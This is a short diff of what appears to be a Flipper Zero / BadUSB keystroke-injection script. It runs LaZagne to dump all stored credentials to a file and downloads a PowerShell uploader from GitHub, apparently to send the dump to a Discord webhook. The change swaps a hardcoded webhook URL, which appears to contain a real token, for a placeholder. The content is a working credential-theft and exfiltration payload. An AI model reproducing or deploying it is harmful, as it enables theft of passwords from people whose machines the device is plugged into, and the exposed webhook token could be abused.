@@ -41,10 +41,10 @@ STRING & "$dir\lazagne.exe" all > "$dir\output.txt"
 ENTER
 
 REM Define Discord webhook URL
-STRING $dc = "https://discordapp.com/api/webhooks/1207911611650547732/XlR8PqioDTgKoWdNsFc9sOYD9xZhs6_cmT9xH3ZRdt3CgDsHJVw3lQMaxqsX9J4KWetv"
+STRING $dc = "{ENTER_YOUR_DISCORD_WEBHOOK}"
 ENTER
 
-REM Download Discord-Upload.ps1 from GitHub
+REM Download Discord-Upload script from my GitHub
 STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/QuackBeans/flipper/main/Discord-Upload.ps1" -OutFile "$dir\Discord-Upload.ps1"
 ENTER
 DELAY 3000  ; Added delay to allow time for the download to complete
